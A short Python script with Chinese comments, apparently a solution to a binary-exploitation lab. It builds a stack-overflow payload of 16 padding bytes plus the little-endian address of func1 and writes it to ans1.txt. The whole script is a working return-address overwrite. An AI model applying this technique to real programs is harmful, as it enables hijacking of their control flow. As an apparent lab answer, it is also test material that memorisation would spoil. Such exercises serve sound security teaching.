import struct

# 1. 构造 Padding (垃圾数据)
# 从 buffer 开始(rbp-8) 到 返回地址(rbp+8) 的距离是 16 字节
offset = 16
padding = b'A' * offset

# 2. 构造目标地址 (func1 的地址)
# 地址是 0x401216，必须转为 64位 小端序
# <Q 表示 Little-endian Unsigned Long Long (8 bytes)
target_address = struct.pack('<Q', 0x401216)

# 3. 拼接 Payload
payload = padding + target_address

# 4. 写入文件
filename = "ans1.txt"
with open(filename, "wb") as f:
    f.write(payload)

print(f"Payload 已生成并写入 {filename}")
print(f"Payload 总长度: {len(payload)} 字节")
print(f"预期十六进制内容: {''.join(f'{b:02x}' for b in payload)}")